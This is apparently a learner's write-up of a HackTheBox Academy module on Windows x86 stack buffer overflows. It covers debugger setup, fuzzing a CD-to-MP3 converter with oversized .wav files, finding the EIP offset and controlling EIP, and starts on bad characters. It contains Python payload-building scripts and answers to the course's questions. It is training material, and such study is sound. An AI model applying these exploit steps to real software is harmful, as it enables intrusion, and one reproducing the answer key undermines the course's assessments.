> # Prerequisite 
> HackTheBox Academy have the module name Stack-Based Buffer Overflow on Linux x86. First Complete that Room For Better Understanding/Progress in this module That is the Prerequisite for this module.

**Page 1 / Buffer Overflow**

# Buffer Overflow
---

Binary exploitation is among the most essential skills for any pentester. It is usually the way to find the most advanced vulnerabilities in programs and operating systems and requires a lot of skill. Over the years, many protections have been added to the way memory is handled by the OS Kernel and how binaries are compiled to prevent such vulnerabilities. Still, there are always newer ways to exploit minor mistakes found in binaries and utilize them to gain control over a remote machine or gain higher privilege over a local machine.

As binary and memory protections become more advanced, however, so do the binary exploitation methods. This is why modern binary exploitation methods require a deep understanding of Assembly language, Computer Architecture, and the fundamentals of binary exploitation.

Both Assembly language and Computer Architecture were thoroughly covered in the [Intro to Assembly Language](https://academy.hackthebox.com/course/preview/intro-to-assembly-language) module, and the [Stack-Based Buffer Overflows on Linux x86](https://academy.hackthebox.com/course/preview/stack-based-buffer-overflows-on-linux-x86) module also covered basics of binary exploitation on Linux.

---

## Buffer Overflows

In Binary exploitation, our primary goal is to subvert the binary's execution in a way that benefits us. Buffer Overflows are the most common type of binary exploitation, but other types of binary exploitation exist, such as [Format String](https://owasp.org/www-community/attacks/Format_string_attack) exploitation and 

[Heap Exploitation](https://wiki.owasp.org/index.php/Buffer_Overflows#Heap_Overflow).

A buffer overflow occurs when a program receives data that is longer than expected, such that it overwrites the entire buffer memory space on the 

[stack](https://en.wikipedia.org/wiki/Stack_(abstract_data_type)).

This can overwrite the next Instruction Pointer `EIP` (_or `RIP` in x86_64_), which causes the program to crash because it will attempt to execute instructions at an invalid memory address. By forcing the program to crash, this is the most basic example of exploiting buffer overflows - known as a Denial of Service (`DOS`) attack.

Another basic attack is to overwrite a value on the stack to change the program's behavior. For example, if an exam program had a buffer overflow vulnerability, we can overwrite the buffer enough to overwrite our score. Since our exam score is stored in the stack in this example, we could take advantage of this flaw to change our score.

If we are a bit more sophisticated, we can change the address of `EIP` to an instruction that will execute our shellcode. This would allow us to execute any command we want instead of just crashing the program, known as Jumping to Shellcode.

With more advanced memory protections, it may not be possible to load our entire shellcode and point to it. Instead, we may use a combination of instructions from the binary to execute a particular function and overwrite various pointers to change the program execution flow. This is known as Return Oriented Programming (`ROP`) attacks.

Finally, modern programs and operating systems may use the Heap instead of the Stack to store buffer memory, which would require Heap Overflows or Heap Exploitation methods.

---

## Stack Overflow

Let's start by demonstrating how the stack works in storing data. The stack has a Last-in, First-out (LIFO) design, which means we can only `pop` out the last element `push`ed into the stack. If we `push` an item into the stack, it would be located on the top of the stack. If we `pop` anything from the stack, the item located at the top of the stack would get popped.

The following table demonstrates how the stack works. We can click on `push` to push a value from `eax` to the stack, and `pop` to pop the top value from the stack into `eax`:

![Stack Overflow Concept](https://user-images.githubusercontent.com/85181215/142864991-71175c10-10bb-4541-91fa-10c808f1441c.png)

The above example correctly receives buffer data, such that it never gets overflowed to the next item. Now let's review another example that does not correctly store data on the stack.

The following example expects an input from us that is eight characters long. But what would happen if we sent something longer? Let's try to send '`01234567890123456789`':

![Stack Overflow Concept2](https://user-images.githubusercontent.com/85181215/142865049-5e29389e-0823-46e2-8c93-d223595cf317.png)

As we can see, when we send a string that is longer than expected, it overwrites other existing values on the stack and would even overwrite the entire stack if it is long enough. Most importantly, we see that it overwrote the value at `EIP`, and when the function tries to return to this address, the program will crash since this address '`0x6789`' does not exist in memory. This happens because of the LIFO design of the stack, which grows upwards, while a long string overflows values downwards until it eventually overwrites the return address `EIP` and the bottom of the stack pointer `EBP`. This was explained in the [Intro to Assembly Language](https://academy.hackthebox.com/module/details/85) module.

Whenever a function is called, a new stack frame is created, and the old `EIP` address gets pushed to the top of the new stack frame, so the program knows where to return once the function is finished. For example, if our buffer input overwrites the entire stack and return address `EIP`, then the overwritten `EIP` address will be called when the function returns due to a `RET` instruction.

If we calculate our input precisely, we can place a valid address in the location where `EIP` is stored. This would lead the program to go to our overwritten address when it returns and subvert the program execution flow to an address of our choosing.

---

## Real-World Examples

There have been numerous incidents where stack overflow exploits were used to break into restricted systems, like mobile phones or gaming consoles.

In 2010, iPhones running on iOS 4 were jailbroken using the [greenpois0n](https://www.theiphonewiki.com/wiki/Greenpois0n_(jailbreak)) jailbreak, which utilized two different exploits to gain kernel-level access over the iPhone and install unofficial/unsigned software and apps. One of these exploits was a stack-based buffer overflow on the iPhone's [HFS Volume Name](https://www.theiphonewiki.com/wiki/HFS_Legacy_Volume_Name_Stack_Buffer_Overflow). At that time, iPhones did not automatically randomize the address space, and iOS 4.3 patched these vulnerabilities and introduced memory protections like randomizing address spaces with Address Space Layout Randomization ([ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization)).

A stack-based buffer overflow exploit was also used to gain kernel-level access on the original PlayStation Portable (PSP) running Firmware v2.0. This allowed the use of pirated games as well as installing unsigned software. The [TIFF Exploit](https://en.wikibooks.org/wiki/PSP/Homebrew_History) exploits a vulnerability found in the TIFF image library used in the PSP's photo viewer. This leads to code execution by simply viewing a malicious `.tiff` file in the photo viewer after setting the background to a corrupt `.png` image. Another similar stack overflow exploit was later discovered in the PSP game "Grand Theft Auto: Liberty City Stories", which had an overflow vulnerability in its Saved Game data and can be exploited by loading a malicious load file.

Another example of a stack-based buffer overflow exploit was used to gain kernel-level access on the original Nintendo Wii, which also allowed the use of pirated games and the installation of unsigned software. The [Twilight Hack](https://wiibrew.org/wiki/Twilight_Hack) exploits a vulnerability found in "The Legend of Zelda: Twilight Princess" game and is also exploited by loading malicious Saved Game data, by using a long name for Link's horse "Epona".

Finally, in 2020 a new vulnerability was found for the PlayStation 2, almost 20 years after its initial release. The [FreeDVDBoot](https://cturt.github.io/freedvdboot.html) exploits a vulnerability in the PS2's DVD player by placing a malicious "VIDEO_TS.IFO" file. This gets read by the DVD player and causes an overflow that can lead to code execution. This was the first-ever PS2 hack that is entirely software-based, as all older hacks utilized some form of hardware like a malicious memory card to load and execute unsigned software.

Of course, operating systems like Windows, Linux, and macOS were always the first target for stack-based buffer overflow exploits. There have been numerous such vulnerabilities found in all of these systems and software running on them. By detecting these vulnerabilities before products go into production, we would reduce the occurrence of potentially catastrophic pitfalls.

---

## Stack Overflow Protections

As we may notice from the above examples, most of them are pretty old, aging back at least a decade. This is because modern operating systems have many protections for the stack, like preventing code execution or randomly changing the memory addresses. These protections make it so we cannot easily run our code placed on the stack or pre-calculate the memory address to jump to.

However, even with these types of protections, if a program is vulnerable to a Buffer Overflow, there are advanced methods to bypass these protections. Some examples include the previously mentioned Return Oriented Programming (`ROP`) or Windows-specific exploitation methods like Egg Hunting or Structured Exception Handling (`SEH`) exploitation.

Furthermore, modern compilers prevent the usage of functions that are vulnerable to Stack overflows, which significantly reduces the occurrence of stack-based buffer overflows. This is why stack-based buffer overflows are less common these days. At the same time, other more advanced types of binary exploitation are more common, as they can't be mitigated by simply enabling a protection method.

---

## Why Learn Basic Stack Overflows?

In this module, we'll learn how to gain code execution through basic stack-based buffer overflows. We will do so on applications and systems that do not have any memory protection. Otherwise, we'd require more advanced methods to gain code execution.

`But if basic stack-based overflows are no longer common these days, then why should we learn them?`  
We do so because learning them gives us a good understanding of the basics of binary exploitation and the fundamentals of exploit development.

Furthermore, once we master how to detect and exploit basic stack-based buffer overflows, it will be much easier to learn [Structured Exception Handling (SEH)](https://docs.microsoft.com/en-us/cpp/cpp/structured-exception-handling-c-cpp?view=msvc-160#:~:text=Structured%20exception%20handling%20(SEH)%20is,code%20more%20portable%20and%20flexible.), which is very common in modern Windows systems.

Finally, once we get a good grip on basic stack overflows and basic mitigation bypasses, we would be ready to start learning advanced mitigation bypass methods, like (`ROP`) and other advanced binary exploitation methods.

**Page 2 / Debugging Windows Programs**

# Debugging Windows Programs

To successfully identify and exploit buffer overflows in Windows programs, we need to debug the program to follow its execution flow and its data in memory. There are many tools we can use for debugging, like [Immunity Debugger](https://www.immunityinc.com/products/debugger/index.html), [OllyDBG](http://www.ollydbg.de), [WinGDB](http://wingdb.com), or [IDA Pro](https://www.hex-rays.com/products/ida/). However, these debuggers are either outdated (Immunity/OllyDBG) or need a pro license to use (WinGDB/IDA).

In this module, we will be using [x64dbg](https://github.com/x64dbg/x64dbg), which is an excellent Windows debugger aimed specifically at binary exploitation and reverse engineering. `x64dbg` is an open-source tool developed and maintained by the community and also supports x64 debugging (unlike Immunity), so we can keep using it when we want to move to Windows x64 buffer overflows.

In addition to the debugger itself, we will utilize a binary exploitation plugin to efficiently carry out many tasks required for identifying and exploiting buffer overflows. One popular plugin is [mona.py](https://github.com/x64dbg/mona), which is an excellent binary exploitation plugin, though it is no longer maintained, does not support x64, and runs on Python2 instead of Python3.  
So instead, we will be using [ERC.Xdbg](https://github.com/Andy53/ERC.Xdbg), which is an open-source binary exploitation plugin for x64dbg.

---

## Installation

All of these tools are already installed on the Windows VM found at the end of the section, which you can connect to from the Pwnbox with the below command:

```shell-session
W4H33D@htb[/htb]$ xfreerdp /v:<target IP address> /u:htb-student /p:<password>
```

You can also use the same command on your own Linux VM or connect to the Windows VM with RDP on Windows or macOS. To connect to the VM from your machine, you must first connect using the VPN key found at the end of the section. It is also possible to install the tools on your own Windows VM, as shown next.

#### x64dbg

To install `x64dbg`, we can follow the instructions as shown in its [GitHub Page](https://github.com/x64dbg/x64dbg), and go to the [latest release](https://github.com/x64dbg/x64dbg/releases/tag/snapshot) page, and download the `snapshot_<SNIP>.zip` file. Once we download it in our Windows VM, we can extract the `zip` archive content, rename the `release` folder to something like `x64dbg`, and move it to our `C:\Program Files` folder, or keep it in any folder we want.

Finally, we can double-click on `C:\Program Files\x64dbg\x96dbg.exe` to register the shell extension and add a shortcut to our Desktop.

Note: `x64dbg` comes with two separate applications, one for `x32` and one for `x64`, each under their folder. Clicking on `x96dbg.exe` as noted above will register the version that matches our Windows VM, which in our case is the `x32` one.

Once that's done, we can find the `x32dbg` icon on our Desktop, and we can double-click it to start our debugger: 

![x32dbg](https://academy.hackthebox.com/storage/modules/89/win32bof_x32dbg_1.jpg)

Tip: To use the dark theme like the above screenshot, simply go to `Options > Theme` and select `dark`.

#### ERC

To install the `ERC` plugin, we can go to the [release page](https://github.com/Andy53/ERC.Xdbg/releases), and download the `zip` archive that matches our VM (`x64` or `x32`), which in our case is `ERC.Xdbg_32-<SNIP>.zip`. Once we download it to our Windows VM, we can extract its content into `x32dbg` plugins folder located in `C:\Program Files\x64dbg\x32\plugins`.

When that's complete, the plugin should be ready for use. So, once we run `x32dbg`, we can type `ERC --help` in the command bar at the bottom to view `ERC`'s help menu.

To view the `ERC`'s output, we must switch to the `Log` tab by clicking on it or by clicking `Alt+L`, as we can see below: ![ERC Help](https://academy.hackthebox.com/storage/modules/89/win32bof_ERC_help.jpg)

We can also set a default working directory to have all output files saved to, using the following command:

ERC

```powershell-session
ERC --config SetWorkingDirectory C:\Users\htb-student\Desktop\
```

Now all of our output should be saved on our Desktop.

---

## Debugging a Program

Whenever we want to debug a program, we can either run it through `x32dbg`, or run it separately and then attach to its process through `x32dbg`.

To open a program with `x32dbg`, we can select `File>Open` or press `F3`, which will prompt us to select the program to be debugged. If we wanted to attach to a process/program that is already running, we could select `File>Attach` or press `Alt+A`, and it will present us with various running processes accessible by our user: 

![Attach Process](https://academy.hackthebox.com/storage/modules/89/win32bof_attach_process.jpg)

We can select the process we want to debug and click on `Attach` to start debugging it.

Tip: If we wanted to debug a process and it was not shown in the "Attach Window", we can try running x32dbg as an admin, by clicking on `File > Restart as Admin`, and then we will have access to all running processes on our VM.

---

## Getting Help

If we wanted any help with either of these tools, we could refer to the [x64dbg documentation](https://help.x64dbg.com/en/latest/) and the [ERC documentation](https://andy53.github.io/ERC.net/api/index.html).

Now that we have all of our tools set up, we can start debugging our first software to try and find a stack overflow vulnerability and exploit it.

**Academy Question**

Q: Try to RDP into the Windows VM using one of the methods mentioned above, and apply what you learned in this module. When you try to attach to 'Free CD to MP3 Converter', what is the name of its process?
**Hint: Check the 'Name' column.**
> A: cdextract

**Solution**
First Connect to Academy VPN and after that connect to virtual machine RDP using the following command syntax
```shell
$ xfreerdp /v:<target IP address> /u:htb-student /p:<password>
```
After successfully connected to the RDP you will see a executable file in desktop name `x32dbg` and `free CD to mp3 converter` Open both files. In `x32dbg` press `ALT+A` or use `file/attach` option to attach a running program to `x32dbg` They will show you all running processes and there you will see `free CD to mp3 converter` process but with different name and have same icon. Submit its name in `Name` section.

![x32dbg_ProcessName](https://user-images.githubusercontent.com/85181215/142865150-511e58ef-4222-4b6d-9bcf-868e48f6e7ea.png)


**Page 3 / Fuzzing Parameters**

# Fuzzing Parameters

For stack-based buffer overflow exploitation, we usually follow four main steps to identify and exploit the buffer overflow vulnerability:

1.  Fuzzing Parameters
2.  Controlling EIP
3.  Identifying Bad Characters
4.  Finding a Return Instruction
5.  Jumping to Shellcode

Usually, the first step in any binary vulnerability exercise is fuzzing various parameters and any other input the program accepts to see whether our input can cause the application to crash. If any of our input successfully causes the program to crash, we review what caused the program to crash. If we see that the program crashed because our input overwrote the `EIP` register, we likely have a stack-based buffer overflow vulnerability. All that is left is to exploit this vulnerability successfully, which can vary in difficulty depending on the OS, program architecture, and protections.

Let's start by debugging a local program called `Free CD to MP3 Converter`, which can be found in the Windows VM below.

---

## Identifying Input Fields

As discussed in the previous section, we can either open our program with x32dbg or run it separately and attach to it. It is always preferable to run it separately and attach to it to ensure we would debug it exactly as it is when run normally. This may not make a lot of difference for basic programs like this one, but other programs that rely on various libraries may face some differences, which is why we prefer attaching to a process. Once our debugger is attached to `Free CD to MP3 Converter`, we can start fuzzing various input fields.

Depending on the program's size, there may be various input fields to fuzz. Examples of potential input fields include:


**Field** 
`Text Input Fields`
**Example**
- Program's "license registration" field.  
- Various text fields found in the program's preferences. 

**Field** 
`Opened Files`
**Example**
- Any file that the program can open.

**Field** 
`Program Arguments`
**Example**
- Various arguments accepted by the program during runtime.

**Field** 
`Remote Resources`
**Example**
- Any files or resources loaded by the program on run time or on a certain condition.

These are the main parameters we usually fuzz, but many other parameters may be exploitable as well.

As any program may have many of these types of parameters, and each may have to be fuzzed with various kinds of inputs, we should attempt to select parameters with the highest possibilities of overflows and start fuzzing them. We should look for a field that expects a short input, like a field that sets the date, as the date is usually short so that the developers may expect a short input only.

Another common thing we should look for is fields that are expected to be processed somehow, like the license number registration field, as it will probably be run on a specific function to test whether it is a correct license number. License numbers also tend to have a specific length so that developers may be expecting a certain length only, and if we provide a long enough input, it may overflow the input field.

The same applies to opened files, as opened files tend to be processed after being opened. While developers may keep a very long buffer for opened files, certain files are expected to be shorter, like configuration files, and if we provide a long input, it may overflow the buffer. Certain file types tend to cause overflow vulnerabilities, like `.wav` files or `.m3u` files, due to the vulnerabilities in the libraries that process these types of files.

With that in mind, let's start fuzzing some fields in our program.

---

## Fuzzing Text Fields

We go through the program's various menu items, and as we just mentioned, the license registration fields are always a good candidate for overflows, so let's start fuzzing them.

Let's start by creating a very large text payload, like `10,000` characters, and input them into our field. We can get our text payload with python, as follows:

```powershell-session
PS C:\Users\htb-student\Desktop> python -c "print('A'*10000)"

AAAAA...SNIP....AAAA
```

Now we can copy our payload and paste it in both fields of the registration window, and click `Ok`:  

![](https://academy.hackthebox.com/storage/modules/89/win32bof_registration_fuzz.jpg)

As we can see, the program does not crash and just tells us `Registration is not valid`.

`Try fuzzing other fields that accept a text input using the same above payload, and see if any of them causes the program to crash.`

---

## Fuzzing Opened File

Now let's move to fuzzing the program with opened files. Both the program's `File` menu and clicking on the `Encode` button seem to accept `.wav` files, which is among the files that tend to cause overflows. So, let's try to fuzz the program with `.wav` files.

First, we'll repeat what we did above to generate our text payload and write the output to a `.wav` file, as follows:

```powershell-session
PS C:\Users\htb-student\Desktop> python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"
```

Note: There are much more advanced methods of fuzzing parameters, by automatically sending various types of input fields and parameters to attempt and crash the program. In our case, we are starting with a basic example of a simple long string.

Now, while being attached to `x32dbg`, let's try to open our payload file, by clicking on the `Encode` icon:  

![](https://academy.hackthebox.com/storage/modules/89/win32bof_converter_open_wav.jpg)

The program may get `paused` at some points of the debugging due to breakpoints or `INT3` instructions, so we can simply click on the `Run` button located at the top bar to continue the execution: ![Debugger Pause](https://academy.hackthebox.com/storage/modules/89/win32bof_x32dbg_pause.jpg) 

![](https://academy.hackthebox.com/storage/modules/89/win32bof_x32dbg_run.jpg)

Tip: If we want to skip breaking on the built in breakpoints, we can select `Options > Preferences > Events`, and un-tick everything under `Break on`. Once we do so, the program should stop breaking every time we run it, and will only break when we crash it on an overflow.

Once we open the file, we see that the program crashes, and the debugger pauses with a message saying `First chance exception on 41414141`:

![Crash Message](https://academy.hackthebox.com/storage/modules/89/win32bof_crash_1.jpg)

The message indicates that the program tried to execute the address `41414141`. In ASCII, the upper case `A` has hex code `0x41`, so it looks like the program tried to go to address `AAAA`, which means that we have successfully changed the `EIP` address.

We can confirm that by checking the registers window on the top right: 

![Crash Registers](https://academy.hackthebox.com/storage/modules/89/win32bof_crash_registers.jpg)

As we can see, we indeed overwrote both `EBP` and `EIP`, and then the program tried to execute our overwritten `EIP` address.

We can even check the stack on the bottom right window and see that our buffer is filled with `A`'s:

![Crash Stack](https://academy.hackthebox.com/storage/modules/89/win32bof_crash_stack.jpg)

This shows that we are controlling the `EIP`, so we may exploit this vulnerability to execute the shellcode we write to memory.

In the next section, we'll see how we can put a specific value in the `EIP`, by calculating how far it is into the stack and changing our payload to reflect that.

**Academy Question**

Q: Try to fuzz the program with '.wav' files of increments of 1000 bytes '1000, 2000, 3000...', and find the smallest payload size that crashes the program and overwrites EIP with '41414141'.
**Hint: Double check that EIP is overwritten with '41414141'**

> A:  5000


**Page 4 / Controlling EIP**

# Controlling EIP

So far, we have successfully fuzzed parameters and identified a vulnerable entry point. Our next step would be to precisely control what address gets placed in `EIP`, such that it gets executed when the program returns from the function with the `ret` instruction. To do so, we must first calculate our exact offset of `EIP`, which means how far away `EIP` is from the beginning of input. Once we know the offset, we can fill the buffer leading to `EIP` with any junk data and then place the instruction address we want to be executed at `EIP`'s location.

---

## EIP Offset

There are many tricks we can use to find the offset of `EIP` from our input. One way to do so is to send a buffer half-filled with `A`'s and half-filled with `B`'s, and then seeing which character fills `EIP`. If it gets filled with `0x41`'s, it would indicate it's in the first half, and if it gets filled with `0x42`, it would mean it's in the second half. Once we know which half `EIP` lies in, we can repeat the same procedure with that half and split it into two quarters, and so on, until we pinpoint exactly where `EIP` is.

However, as we can imagine, this is not a very fast or efficient method to find the offset, and we would only use it in cases where the buffer is tens of thousands of characters in length, as we won't be able to use our second method in these types of cases. Even then, we would use the 'halves' method to find the general location of `EIP` in our buffer and then would use the second method to find its exact location.

Another method of finding `EIP`'s offset is by using a unique pattern as our input and then seeing which values fill `EIP` to calculate precisely how far away it is from the beginning of our pattern. For example, we can send a pattern of sequential numbers, 'i.e. `12345678...`', and see which numbers would fill `EIP`. However, this is not a very practical method, as once numbers start getting larger, it would be difficult to know which number it is since it may be part of one number and part of another number. Furthermore, as numbers start getting 2 or 3 digits long, they would no longer indicate the actual offset since each number would fill multiple bytes. As we can see, using numbers as our pattern would not work.

The best way to calculate the exact offset of `EIP` is through sending a unique, non-repeating pattern of characters, such that we can view the characters that fill `EIP` and search for them in our unique pattern. Since it's a unique non-repeating pattern, we will only find one match, which would give us the exact offset of `EIP`.

Luckily, we don't have to manually code a script that creates this unique pattern or code another to find and calculate how far the value is from the beginning of the unique pattern. This is because numerous tools can do so, like `pattern_create` and `pattern_offset`, which are also included with the `ERC` plugin we installed earlier.

---

## Creating Unique Pattern

We can generate a unique pattern with `pattern_create` either in our `PwnBox` instance or right within our debugger `x32dbg` with the `ERC` plugin. To do so in `PwnBox`, we can use the following command:

```shell-session
W4H33D@htb[/htb]$ /usr/bin/msf-pattern_create -l 5000

Aa0Aa1Aa2...SNIP...3Gk4Gk5Gk
```

We can now feed this buffer to our program as a `.wav` file. However, it's always easier to do everything in Windows to avoid jumping between two VMs. So, let's see how we can get the same pattern with `ERC`.

If we use the `ERC --help` command, we see the following guidance:

```cmd-session
--Pattern
Generates a non repeating pattern. A pattern of pure ASCII characters can be generated up to 20277 and up to  
66923 if special characters are used. The offset of a particular string can be found inside the pattern by 
providing a search string (must be at least 3 chars long).
    Pattern create: ERC --pattern <create | c> <length>
    Pattern offset: ERC --pattern <offset | o> <search string>
```

As we can see, we can use `ERC --pattern c 5000` to get our pattern. So, let's use this command and see what we get: 

![Pattern Create](https://academy.hackthebox.com/storage/modules/89/win32bof_erc_pattern_create_1.jpg)

This pattern is the same pattern we got with the `msf-pattern_create` tool, so we can use either. We can now go to our Desktop to find the output saved to a file called `Pattern_Create_1.txt`. Now we can save the pattern in a `.wav` file and load it into our program. However, to do that, we'll start building our exploit, which we will keep developing and using for other parts of the buffer overflow exploitation process.

---

## Writing Our Exploit

We will write our exploit in Python3 since it contains built-in libraries to help us in this process, like `struct` and `requests`. We will also write each part of the exploitation process under its own function so that we don't have to jump between different exploit scripts and just call a different function for each part of the process.

We can start by creating a new function with `def eip_offset():`, and then create our `payload` variable as a `bytes` object and paste between the parenthesis the `Ascii:` output from `Pattern_Create_1.txt`. So, we can click on the Windows Search bar at the bottom and write `IDLE`, which would open the Python3 editor, and then click `ctrl+N` to start writing a new python script where we can start writing our code. Our initial code should look as follows:

Code: python

```python
def eip_offset():
    payload = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
                    ...SNIP...
                    "Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk", "utf-8")
```

Next, under the same `eip_offset()` function, we will write `payload` to a file called `pattern.wav`, by adding the following lines:

Code: python

```python
    with open('pattern.wav', 'wb') as f:
        f.write(payload)
```

Note how we are always using bytes for our data, and use `'wb'` to write our pattern in bytes. This is because we should create our payload as it will be processed by the program, which in a buffer overflow exercise is in bytes, since it will be loaded into the stack as machine code in bytes.

Finally, we should call our `eip_offset()` function by adding the following line at the end. Otherwise, the function will not get run:

Code: python3

```python3
eip_offset()
```

Now, we can save this exploit to our Desktop as `win32bof_exploit.py`, and run it. To run it while still in our `IDLE`, we can click on `Run > Run Module`, or click `F5`: 

![Pattern IDLE](https://academy.hackthebox.com/storage/modules/89/win32bof_python_idle_exploit_2.jpg)

Once we do, we will see the new file `pattern.wav` on our Desktop.

---

## Calculating EIP Offset

Now that we have our pattern saved into a `.wav` file, we can load it into our program. We should ensure that the program is running and is attached to `x32dbg`, and then we can open our file as we did in the previous section. We can click on the `restart` button in `x32dbg` to restart our program if our previous input had crashed it:  

![](https://academy.hackthebox.com/storage/modules/89/win32bof_x32dbg_restart.jpg)

Once we do, we should see that our program crashes due to the long input. Most importantly, we should see that the `EIP` register got overwritten with part of our unique pattern: 

![Pattern EIP](https://academy.hackthebox.com/storage/modules/89/win32bof_pattern_eip.jpg)

Now we can use the value of `EIP` to calculate the offset. We can once again do it in our `PwnBox` with `msf-pattern_offset` (the counterpart of `msf-pattern_create`), by using the hex value in `EIP`, as follows:

```shell-session
W4H33D@htb[/htb]$ /usr/bin/msf-pattern_offset -q 31684630

[*] Exact match at offset 4112
```

As we can see, it tells us that our `EIP` offset is `4112` bytes. We can also stay in the `Windows` VM and use `ERC` to calculate the same offset. First, we should get the ASCII value of the hex bytes found in `EIP`, by right-clicking on `EIP` and selecting `Modify Value`, or by clicking on `EIP` and then clicking Enter. Once we do, we will see various representations of the `EIP` value, with ASCII being the last one: 

![ASCII EIP](https://academy.hackthebox.com/storage/modules/89/win32bof_pattern_eip_ascii.jpg)

The hex value found in `EIP` represents the string `1hF0`. Now, we can use `ERC --pattern o 1hF0` to get the pattern offset: 

![Pattern Offset](https://academy.hackthebox.com/storage/modules/89/win32bof_pattern_offset.jpg)

We once again get `4112` bytes as our `EIP` offset.

The `ERC` plugin can also find the offset automatically with the `ERC --findNRP` command, though it must be noted that this takes significantly longer depending on the size of RAM:

![Pattern Offset NRP](https://academy.hackthebox.com/storage/modules/89/win32bof_pattern_offset_findnrp.jpg)

As we can see, it found the offset based on patterns found in various registers, each of which can be helpful in specific types of binary exploitation. For us, we are only interested in the `EIP` register, which it says has an offset of `4112` bytes, as we have seen previously.

---

## Controlling EIP

Our final step is to ensure we can control what value goes into `EIP`. Knowing the offset, we know exactly how far our `EIP` is from the start of the buffer. So, if we send `4112` bytes, the next 4 bytes would be the ones that fill `EIP`.

Let's add another function, `eip_control()`, to our `win32bof_exploit.py` and create an `offset` variable with the offset we found. Then, we'll create a `buffer` variable with a string of `A` bytes as long as our offset to fill the buffer space, and an `eip` variable with the value we want `EIP` to be, which we will use as `4` bytes of `B`. Finally, we'll add both to a `payload` variable and write it to `control.wav`, as follows:

Code: python

```python
def eip_control():
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip
    
    with open('control.wav', 'wb') as f:
        f.write(payload)

eip_control()
```

Splitting our payload into variables allows us to precisely control each part of the buffer and easily adapt it as we work on our exploit.

Note how the last line now calls our new function `eip_control()`. In the future, we can simply change this line to execute the function we need. Since we are adding functions as we proceed with this module, our functions will be sorted in the order we need them.

We can now run our exploit to generate `control.wav` and load it into our program after restarting it in `x32dbg`. When our program crashes, we see the hex value `42424242`, which is the ASCII representation of `BBBB`:

![Control EIP](https://academy.hackthebox.com/storage/modules/89/win32bof_control_eip.jpg)

We see that we can control the exact value that goes into `EIP`, and we can swap the `B`'s in our exploit with the address we want, and the program should call it.

Before we choose an address to call, we should first check if we should avoid any specific characters in our input, which we will discuss in the next section.

**Academy Question**

Q: If you find the value 'B5eB' in EIP after sending your pattern, what would be the EIP offset?
**Hint: Use the ERC plugin**
> A: 915

**Solution**
Open `x32dbg` and attach the process or open the `free cd to mp3 converter` in `x32dbg` after that using the following command in command panel of `x32dbg` 
```ERC
ERC --pattern o B5eB
```
When you run the above command you can see its output on log section of `x32dbg`.

**Page 5 / Identifying Bad Characters**

# Identifying Bad Characters

Before we start to utilize the fact that we can control the `EIP` and subvert the program's execution flow, we need to determine any characters we should avoid using in our payload.

As we are attacking an input parameter (an opened file in this case), the program is expected to process our input. So, depending on the processing each program executes on our input, certain characters may tell the program that it has reached the end of the input. This may happen even though it may not have reached the end of the input yet.

For example, a very common bad character is a null byte `0x00`, used in Assembly as a string terminator, which tells the processor the string has ended. So, if our payload included a null byte, the program may stop processing our shellcode, thinking it has reached the end of it. This will cause our payload not to execute correctly, and our attack would fail. More examples are `0x0a` and `0x0d`, which are the new line `\n` and carriage return `\r`, respectively. If we were exploiting a buffer overflow in a string input that is expected to be a single line (like a license key), these characters would probably end our input prematurely, which would also cause our payload to fail.

---

## Generating All Characters

To identify bad characters, we have to send all characters after filling the `EIP` address, which is after `4112` + `4` bytes. We then check whether any of the characters got removed by the program or if our input got truncated prematurely after a specific character.

To do this, we would need two files:

1.  A `.wav` file with all characters to load into the program
2.  A `.bin` file to compare with our input in memory

We can use `ERC` to generate the `.bin` file and generate a list of all characters to create our `.wav` file. To do so, we can use the `ERC --bytearray` command: 

![ERC Byte Array](https://academy.hackthebox.com/storage/modules/89/win32bof_erc_bytearry.jpg)

This also creates two files on our Desktop:

-   `ByteArray_1.txt`: Which contains the string of all characters we can use in our python exploit
-   `ByteArray_1.bin`: Which we can use with `ERC` later to compare with our input in memory

---

## Updating our exploit

The next step would be to generate a `.wav` file with the characters string generated by `ERC`. We will once again write a new function `bad_chars()`, and use a similar code to the `eip_control()` function, but will use the characters under `C#` in `ByteArray_1.txt`. We will create a new list of bytes `all_chars = bytes([])`, and paste the characters between the brackets. We will then write to `chars.wav` the same `payload` from `eip_control()`, and add after it `all_chars`. The final function would look as follows:

Code: python

```python
def bad_chars():
    all_chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        ...SNIP...
        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])
    
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars
    
    with open('chars.wav', 'wb') as f:
        f.write(payload)

bad_chars()
```

Note how we added a `b` before `A` and `B` to turn them into bytes

We can now run our exploit with `F5` to generate the `chars.wav` file.

---

## Comparing our Input

Now we can restart our program in `x32dbg` and load `chars.wav` to it. Once we do, we can start comparing our input in memory and seeing whether any characters are missing. To do so, we can check the Stack pane on the bottom right of `x32dbg`, which should be aligned exactly at the beginning of our input: 

![Byte Stack](https://academy.hackthebox.com/storage/modules/89/win32bof_bytes_stack.jpg)

We can now manually go through the stack line by line from right to left and ensure that all hex values are present, from `0x00` to `0xff`. As this may take a while, and we would entirely rely on our eyes, we may miss a character or two. So, we will once again utilize `ERC` to make the comparison for us. It will easily compare our input in memory to all characters.

We must first copy the address of `ESP` since this is where our input is located. We can do this by right-clicking on it and selecting `Copy value`, or clicking `[Ctrl + C]`: 

![Byte ESP](https://academy.hackthebox.com/storage/modules/89/win32bof_bytes_esp.jpg)

Once we have the value of `ESP`, we can use `ERC --compare` and give it the `ESP` address and the location of the `.bin` file that contains all characters, as follows:

```cmd-session
ERC --compare 0014F974 C:\Users\htb-student\Desktop\ByteArray_1.bin
```

What this command will do is compare byte-by-byte both our input in `ESP` and all characters that we generated earlier in `ByteArray_1.bin`: 

![Byte Compare 1](https://academy.hackthebox.com/storage/modules/89/win32bof_bytes_compare.jpg)

